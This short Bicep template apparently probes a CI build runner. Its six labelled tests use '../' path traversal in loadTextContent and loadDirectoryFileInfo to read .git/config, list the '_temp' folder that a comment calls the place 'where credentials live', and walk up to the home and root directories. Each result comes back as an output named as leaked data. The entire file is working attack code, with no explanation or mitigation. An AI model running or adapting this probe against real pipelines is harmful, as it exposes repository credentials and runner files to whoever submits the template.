// Test 1: Read .git/config (contains credential file path)
var gitConfig = loadTextContent('../.git/config')
output leakedGitConfig string = gitConfig

// Test 2: List _temp directory (where credentials live)
var tempFiles = loadDirectoryFileInfo('../../../_temp/', '*')
output tempFileListing array = tempFiles

// Test 3: List the work directory
var workFiles = loadDirectoryFileInfo('../../../', '*')
output workDirListing array = workFiles

// Test 4: How far up can we traverse?
var rootFiles = loadDirectoryFileInfo('../../../../../', '*')
output rootListing array = rootFiles

// Test 5: Try to list /home/runner via traversal
var homeFiles = loadDirectoryFileInfo('../../../../', '*')
output homeListing array = homeFiles

// Test 6: Check if .git/credentials or similar exists
var gitDir = loadDirectoryFileInfo('../.git/', '*')
output gitDirListing array = gitDir
